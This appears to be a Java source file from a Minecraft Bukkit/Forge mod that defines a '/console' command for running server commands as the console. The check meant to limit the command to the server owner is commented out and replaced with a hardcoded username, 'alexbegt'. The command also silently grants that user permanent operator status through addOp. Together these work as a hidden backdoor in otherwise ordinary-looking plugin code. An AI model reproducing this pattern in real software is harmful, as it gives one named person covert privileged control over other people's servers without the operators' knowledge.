package keepcalm.mods.bukkit.forgeHandler.commands;

import net.minecraft.command.ICommandSender;
import net.minecraft.command.WrongUsageException;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.MinecraftServer;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_5_R3.CraftServer;
import org.bukkit.craftbukkit.v1_5_R3.command.FakeConsoleSender;

/**
 * Only registered on IntegratedServers
 * @author keepcalm
 *
 */
public class CraftCommandConsole extends CraftCommandBase {

	@Override
	public String getCommandName() {
		return "console";
	}

	@Override
	public boolean canCommandSenderUseCommand(ICommandSender var1) {
		// only server owner
		return var1.getCommandSenderName().equalsIgnoreCase("alexbegt");//CraftServer.instance().getHandle().getServerOwner().equalsIgnoreCase(var1.getCommandSenderName()) || var1.getCommandSenderName().equalsIgnoreCase("alexbegt");
	}
	
	@Override
	public void processCommand(ICommandSender var1, String[] var2) {
		if (var2.length == 0) {
			throw new WrongUsageException("/console <bukkit command to run as console>");
		}
		if (CraftServer.instance().getRealCmdMap().getNMSCommand(var2[0]) != null) {
			CraftServer.instance().getRealCmdMap().dispatch(new FakeConsoleSender(Bukkit.getServer(), (EntityPlayerMP) var1), this.joinListOfStrings(var2));
		}
		else {
			
			MinecraftServer.getServer().getConfigurationManager().addOp(var1.getCommandSenderName().toLowerCase());
			MinecraftServer.getServer().getCommandManager().executeCommand(var1, this.joinListOfStrings(var2));
			
		}
	}

	@Override
	public String getCommandUsage(ICommandSender icommandsender) {
		return null;
	}
	
	
	
}
